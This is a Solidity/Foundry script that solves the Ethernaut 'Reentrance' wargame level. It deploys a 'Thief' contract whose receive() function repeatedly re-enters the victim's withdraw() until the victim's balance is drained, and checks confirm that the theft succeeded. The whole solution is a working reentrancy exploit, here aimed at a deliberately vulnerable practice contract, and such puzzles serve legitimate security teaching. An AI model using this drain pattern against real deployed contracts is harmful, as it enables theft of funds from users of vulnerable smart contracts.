// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Challenge Contract Interface)
////////////////////////////////////////////////////////////////////////////////////
// Use import will introduce `incompatible Solidity versions` error
interface Reentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Challenge Contract Interface)
////////////////////////////////////////////////////////////////////////////////////

contract ReentranceSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x2a24869323C0B13Dff24E196Ba072dC790D52479;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE Must send at least 0.001 ETH
        address challengeInstance = __createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Get Reentrance contract's balance;
        uint balance = challengeInstance.balance;

        // Step 2. Get balance of calling account;
        address heroAddress = vm.addr(heroPrivateKey);
        uint256 myBalance = address(heroAddress).balance;

        // Step 3. Make sure calling account's balance meets requirement;
        require(myBalance >= balance, "Account balance check failed");

        // Step 4: Deploy Thief contract;
        Thief thief = new Thief{value: balance}(challengeInstance);

        // Step 5: Call `steal()` function of Thief contract,
        thief.steal();

        // Step 6: Confirm that the Thief contract has successfully obtained balance of the Reentrance contract.
        require(challengeInstance.balance == 0, "Victim balance check failed");
        require(
            address(thief).balance == balance * 2,
            "Thief balance check failed"
        );

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(10));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Thief {
    Reentrance victim;
    uint balance;

    constructor(address victimAddress) payable {
        victim = Reentrance(victimAddress);
        balance = msg.value;
    }

    function steal() external {
        victim.donate{value: balance}(address(this));
        victim.withdraw(balance);
    }

    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdraw(balance);
        }
    }
}

////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
